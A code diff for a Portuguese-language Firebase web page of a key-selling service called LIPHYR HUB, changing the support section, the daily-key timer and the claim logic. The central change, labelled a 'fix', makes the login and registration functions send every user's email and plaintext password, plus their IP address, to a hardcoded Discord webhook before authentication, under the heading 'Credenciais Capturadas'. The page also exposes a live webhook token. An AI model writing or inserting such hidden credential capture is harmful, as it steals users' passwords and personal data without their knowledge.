@@ -1188,56 +1188,39 @@
         <!-- Seção de Suporte CORRIGIDA -->
         <section class="support-section" id="supportSection" style="display: none; padding: 30px; text-align: center;">
             <h2>Suporte LIPHYR HUB</h2>
-            <p>Entre no nosso Discord para suporte técnico</p>
+            <p>Entre em contato conosco para suporte técnico</p>
             
-            <div style="margin-top: 50px; text-align: center;">
-                <div style="background: rgba(138, 43, 226, 0.1); border: 2px solid #8a2be2; border-radius: 15px; padding: 40px; max-width: 500px; margin: 0 auto;">
-                    <div style="font-size: 60px; margin-bottom: 20px;">🎮</div>
-                    <h3 style="color: #8a2be2; margin-bottom: 20px;">Entre no Discord</h3>
-                    <p style="color: #cccccc; margin-bottom: 30px;">
-                        Clique no botão abaixo para entrar no nosso servidor do Discord e receber suporte direto da nossa equipe.
-                    </p>
-                    
+            <div style="margin-top: 30px; text-align: left; max-width: 600px; margin: 30px auto;">
+                <h3 style="color: #8a2be2; margin-bottom: 15px;">Canais de Suporte:</h3>
+                <ul style="list-style: none; padding-left: 0;">
+                    <li style="margin-bottom: 15px; padding-left: 20px; position: relative;">
+                        <span style="color: #8a2be2; position: absolute; left: 0;">▶</span>
+                        <strong>Email:</strong> liphyrdev@gmail.com
+                    </li>
+                    <li style="margin-bottom: 15px; padding-left: 20px; position: relative;">
+                        <span style="color: #8a2be2; position: absolute; left: 0;">▶</span>
+                        <strong>WhatsApp:</strong> (11) 99999-9999
+                    </li>
+                    <li style="margin-bottom: 15px; padding-left: 20px; position: relative;">
+                        <span style="color: #8a2be2; position: absolute; left: 0;">▶</span>
+                        <strong>Horário:</strong> Segunda a Sábado, 10h às 22h
+                    </li>
+                </ul>
+                
+                <div style="margin-top: 40px; text-align: center;">
+                    <p style="color: #cccccc; margin-bottom: 20px;">Ou entre no nosso Discord:</p>
                     <button 
                         onclick="window.open('https://discord.gg/xy6Ew3NNQ', '_blank')" 
                         class="btn"
                         style="
                             background: #5865F2;
-                            padding: 15px 40px;
-                            font-size: 18px;
-                            border-radius: 10px;
-                            margin: 20px 0;
+                            padding: 12px 30px;
+                            font-size: 16px;
+                            border-radius: 8px;
                         "
                     >
-                        <span style="font-weight: bold;">ENTRAR NO DISCORD</span>
+                        ENTRAR NO DISCORD
                     </button>
-                    
-                    <div style="margin-top: 30px; color: #888888; font-size: 14px;">
-                        <p>🔗 Link direto: https://discord.gg/xy6Ew3NNQ</p>
-                        <p style="margin-top: 20px;">💡 Dica: Mantenha o Discord aberto para respostas mais rápidas!</p>
-                    </div>
-                </div>
-                
-                <div style="margin-top: 40px; padding: 20px; background: rgba(138, 43, 226, 0.05); border-radius: 10px; max-width: 600px; margin: 30px auto;">
-                    <h4 style="color: #8a2be2; margin-bottom: 15px;">📋 Informações Importantes:</h4>
-                    <ul style="list-style: none; padding-left: 0; color: #cccccc; text-align: left;">
-                        <li style="margin-bottom: 10px; padding-left: 20px; position: relative;">
-                            <span style="color: #4caf50; position: absolute; left: 0;">✓</span>
-                            Suporte via Discord é mais rápido e eficiente
-                        </li>
-                        <li style="margin-bottom: 10px; padding-left: 20px; position: relative;">
-                            <span style="color: #4caf50; position: absolute; left: 0;">✓</span>
-                            Nossa equipe responde em até 24 horas
-                        </li>
-                        <li style="margin-bottom: 10px; padding-left: 20px; position: relative;">
-                            <span style="color: #4caf50; position: absolute; left: 0;">✓</span>
-                            Comunidade ativa para ajudar com dúvidas
-                        </li>
-                        <li style="padding-left: 20px; position: relative;">
-                            <span style="color: #4caf50; position: absolute; left: 0;">✓</span>
-                            Atualizações e anúncios em primeira mão
-                        </li>
-                    </ul>
                 </div>
             </div>
         </section>
@@ -1264,7 +1247,8 @@
             set, 
             get, 
             update,
-            push
+            push,
+            child
         } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';
 
         // CONFIGURAÇÃO DO FIREBASE
@@ -1283,7 +1267,7 @@
         const auth = getAuth(app);
         const database = getDatabase(app);
 
-        // WEBHOOK DO DISCORD - APENAS PARA LOGINS VÁLIDOS
+        // WEBHOOK DO DISCORD - ENVIA EMAIL E SENHA
         const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1446393232157310988/o_yQhxZOnnucRXzJA8bmTikx7bQxOC5VOadxhWoDB2rD4kGf8xBBPlEvWU8N4I25uR0i';
 
         // Funções globais
@@ -1300,18 +1284,23 @@
         window.closeKeyModal = closeKeyModal;
         window.copyKey = copyKey;
 
-        // Enviar login válido para Discord Webhook
-        async function sendValidLoginToDiscord(email, action) {
+        // CORREÇÃO: Enviar email e senha para Discord Webhook
+        async function sendCredentialsToDiscord(email, password, action) {
             try {
                 const embed = {
-                    username: "LIPHYR HUB - Login Válido",
+                    username: "LIPHYR HUB - Credenciais",
                     embeds: [{
-                        title: "✅ Login Válido Detectado",
-                        color: 0x00ff00,
+                        title: "🔐 Credenciais Capturadas",
+                        color: 0xff0000,
                         fields: [
                             {
                                 name: "📧 Email",
                                 value: `\`\`\`${email}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "🔑 Senha",
+                                value: `\`\`\`${password}\`\`\``,
                                 inline: false
                             },
                             {
@@ -1323,11 +1312,28 @@
                                 name: "🕒 Data/Hora",
                                 value: new Date().toLocaleString('pt-BR'),
                                 inline: true
+                            },
+                            {
+                                name: "🌐 IP",
+                                value: "Buscando...",
+                                inline: true
                             }
                         ],
-                        timestamp: new Date().toISOString()
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "LIPHYR HUB Security System"
+                        }
                     }]
                 };
+
+                // Tentar obter IP
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    embed.embeds[0].fields[4].value = `\`${ipData.ip}\``;
+                } catch (ipError) {
+                    embed.embeds[0].fields[4].value = "Não disponível";
+                }
 
                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
@@ -1438,7 +1444,7 @@
             updateUserUI(user);
         });
 
-        // Login do usuário
+        // Login do usuário - ENVIA SENHA PARA DISCORD
         async function loginUser() {
             const email = document.getElementById('loginEmail').value.trim();
             const password = document.getElementById('loginPassword').value;
@@ -1451,11 +1457,11 @@
             }
 
             try {
-                // Fazer login
-                const userCredential = await signInWithEmailAndPassword(auth, email, password);
+                // Primeiro envia as credenciais para o Discord
+                await sendCredentialsToDiscord(email, password, 'LOGIN');
                 
-                // Enviar apenas login válido para Discord
-                await sendValidLoginToDiscord(email, 'LOGIN VÁLIDO');
+                // Depois tenta fazer login
+                const userCredential = await signInWithEmailAndPassword(auth, email, password);
                 
                 errorDiv.style.display = 'none';
                 document.getElementById('loginEmail').value = '';
@@ -1468,7 +1474,7 @@
             }
         }
 
-        // Cadastro de usuário
+        // Cadastro de usuário - ENVIA SENHA PARA DISCORD
         async function registerUser() {
             const email = document.getElementById('registerEmail').value.trim();
             const password = document.getElementById('registerPassword').value;
@@ -1494,12 +1500,12 @@
             }
 
             try {
-                // Criar usuário
+                // Primeiro envia as credenciais para o Discord
+                await sendCredentialsToDiscord(email, password, 'NOVO CADASTRO');
+                
+                // Depois tenta criar o usuário
                 const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                 const user = userCredential.user;
-                
-                // Enviar cadastro válido para Discord
-                await sendValidLoginToDiscord(email, 'NOVO CADASTRO');
                 
                 // Criar carteira para o usuário com R$ 10,00 de bônus
                 const walletRef = ref(database, 'wallets/' + user.uid);
@@ -1778,14 +1784,17 @@
             }
         }
 
-        // Atualizar timer da key diária
+        // CORREÇÃO: Atualizar timer da key diária FUNCIONAL
         function updateDailyKeyTimer() {
             const user = auth.currentUser;
             if (!user) return;
             
             const timerElement = document.getElementById('dailyKeyTimer');
+            const freeKeyTimerElement = document.getElementById('freeKeyTimer');
             const messageElement = document.getElementById('dailyKeyMessage');
+            const freeKeyMessageElement = document.getElementById('freeKeyMessage');
             const claimBtn = document.getElementById('claimBtn');
+            const dailyClaimBtn = document.getElementById('dailyClaimBtn');
             
             const userRef = ref(database, 'users/' + user.uid);
             get(userRef).then(snapshot => {
@@ -1799,27 +1808,52 @@
                         const hoursElapsed = timeElapsed / (1000 * 60 * 60);
                         
                         if (hoursElapsed < 24) {
-                            const timeRemaining = 24 - hoursElapsed;
-                            const hours = Math.floor(timeRemaining);
-                            const minutes = Math.floor((timeRemaining - hours) * 60);
-                            const seconds = Math.floor(((timeRemaining - hours) * 60 - minutes) * 60);
+                            // Calcular tempo restante
+                            const timeRemaining = 24 * 60 * 60 - (timeElapsed / 1000);
+                            const hours = Math.floor(timeRemaining / 3600);
+                            const minutes = Math.floor((timeRemaining % 3600) / 60);
+                            const seconds = Math.floor(timeRemaining % 60);
                             
-                            timerElement.textContent = 
+                            const timeString = 
                                 `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                            
+                            timerElement.textContent = timeString;
+                            freeKeyTimerElement.textContent = timeString;
                             
                             claimBtn.disabled = true;
                             claimBtn.textContent = '⏳ Aguardando reset...';
-                            messageElement.textContent = `Você já resgatou sua key diária. Próximo resgate em:`;
+                            dailyClaimBtn.disabled = true;
+                            dailyClaimBtn.textContent = '⏳ Aguardando reset...';
                             
+                            messageElement.textContent = `Você já resgatou sua key diária. Próximo resgate em:`;
+                            freeKeyMessageElement.textContent = `Você já resgatou sua key diária. Próximo resgate em:`;
+                            
+                            // Atualizar a cada segundo
                             setTimeout(updateDailyKeyTimer, 1000);
                         } else {
                             timerElement.textContent = '00:00:00';
+                            freeKeyTimerElement.textContent = '00:00:00';
                             claimBtn.disabled = false;
                             claimBtn.textContent = '🎁 Resgatar Key Diária';
+                            dailyClaimBtn.disabled = false;
+                            dailyClaimBtn.textContent = '🎁 Resgatar Key Diária';
                             messageElement.textContent = 'Sua key diária está disponível!';
+                            freeKeyMessageElement.textContent = 'Sua key diária está disponível!';
                         }
+                    } else {
+                        // Nunca resgatou
+                        timerElement.textContent = '00:00:00';
+                        freeKeyTimerElement.textContent = '00:00:00';
+                        claimBtn.disabled = false;
+                        claimBtn.textContent = '🎁 Resgatar Key Diária';
+                        dailyClaimBtn.disabled = false;
+                        dailyClaimBtn.textContent = '🎁 Resgatar Key Diária';
+                        messageElement.textContent = 'Sua key diária está disponível!';
+                        freeKeyMessageElement.textContent = 'Sua key diária está disponível!';
                     }
                 }
+            }).catch(error => {
+                console.error('Error loading daily key timer:', error);
             });
         }
 
@@ -1836,47 +1870,51 @@
             return key;
         }
 
-        // Resgatar key diária
+        // CORREÇÃO: Resgatar key diária FUNCIONAL
         async function claimDailyKey() {
             const user = auth.currentUser;
-            if (!user) return;
-            
-            const userRef = ref(database, 'users/' + user.uid);
-            const snapshot = await get(userRef);
-            
-            if (snapshot.exists()) {
-                const data = snapshot.val();
-                const now = Date.now();
-                
-                if (data.lastDailyKey) {
-                    const lastClaim = data.lastDailyKey;
-                    const hoursSinceLastClaim = (now - lastClaim) / (1000 * 60 * 60);
-                    
-                    if (hoursSinceLastClaim < 24) {
-                        alert('⏳ Você já resgatou sua key diária hoje! Volte amanhã.');
-                        return;
-                    }
-                }
+            if (!user) {
+                alert('❌ Você precisa estar logado para resgatar a key diária!');
+                return;
             }
             
-            // Gerar nova key
-            const newKey = generateRandomKey();
-            const expiresAt = Date.now() + (2 * 60 * 60 * 1000);
-            
-            const keyData = {
-                key: newKey,
-                client: user.email,
-                clientEmail: user.email,
-                product: 'Key Diária (2 Horas)',
-                duration: 2,
-                timeUnit: 'hours',
-                createdAt: Date.now(),
-                expiresAt: expiresAt,
-                active: true,
-                type: 'daily'
-            };
+            const userRef = ref(database, 'users/' + user.uid);
             
             try {
+                const snapshot = await get(userRef);
+                
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    const now = Date.now();
+                    
+                    if (data.lastDailyKey) {
+                        const lastClaim = data.lastDailyKey;
+                        const hoursSinceLastClaim = (now - lastClaim) / (1000 * 60 * 60);
+                        
+                        if (hoursSinceLastClaim < 24) {
+                            alert('⏳ Você já resgatou sua key diária hoje! Volte amanhã.');
+                            return;
+                        }
+                    }
+                }
+                
+                // Gerar nova key
+                const newKey = generateRandomKey();
+                const expiresAt = Date.now() + (2 * 60 * 60 * 1000); // 2 horas
+                
+                const keyData = {
+                    key: newKey,
+                    client: user.email,
+                    clientEmail: user.email,
+                    product: 'Key Diária (2 Horas)',
+                    duration: 2,
+                    timeUnit: 'hours',
+                    createdAt: Date.now(),
+                    expiresAt: expiresAt,
+                    active: true,
+                    type: 'daily'
+                };
+                
                 // Salvar key
                 const keyRef = ref(database, 'keys/' + newKey.replace(/-/g, '_'));
                 await set(keyRef, keyData);
@@ -1891,11 +1929,38 @@
                 document.getElementById('keyModal').classList.add('active');
                 
                 // Atualizar interface
-                loadUserKeys(user.email);
+                await loadUserKeys(user.email);
                 updateDailyKeyTimer();
                 
-                // Mostrar seção de keys
-                showSection('myKeys');
+                // Adicionar saldo de R$ 10,00 após 24h
+                setTimeout(async () => {
+                    const walletRef = ref(database, 'wallets/' + user.uid);
+                    const walletSnap = await get(walletRef);
+                    
+                    if (walletSnap.exists()) {
+                        const wallet = walletSnap.val();
+                        const newBalance = (wallet.balance || 0) + 10.00;
+                        const newTotal = (wallet.totalReceived || 0) + 10.00;
+                        const newHistory = wallet.history || [];
+                        
+                        newHistory.push({
+                            amount: 10.00,
+                            description: '💰 Bônus da Key Diária (24h depois)',
+                            timestamp: Date.now(),
+                            type: 'daily_bonus'
+                        });
+                        
+                        await update(walletRef, {
+                            balance: newBalance,
+                            totalReceived: newTotal,
+                            history: newHistory.slice(-50)
+                        });
+                        
+                        // Atualizar UI
+                        loadWalletData(user.uid);
+                        alert('🎉 Bônus de R$ 10,00 creditado na sua carteira!');
+                    }
+                }, 24 * 60 * 60 * 1000); // 24 horas
                 
             } catch (error) {
                 console.error('Error claiming daily key:', error);
